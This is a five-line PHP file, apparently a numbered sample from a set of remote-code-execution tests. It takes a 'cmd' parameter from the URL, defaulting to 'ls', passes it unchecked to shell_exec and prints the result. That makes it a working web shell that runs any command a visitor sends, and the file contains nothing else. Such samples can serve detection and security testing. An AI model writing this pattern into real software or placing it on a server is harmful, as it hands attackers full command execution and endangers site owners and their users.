<?php
// RCE test variation #123
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>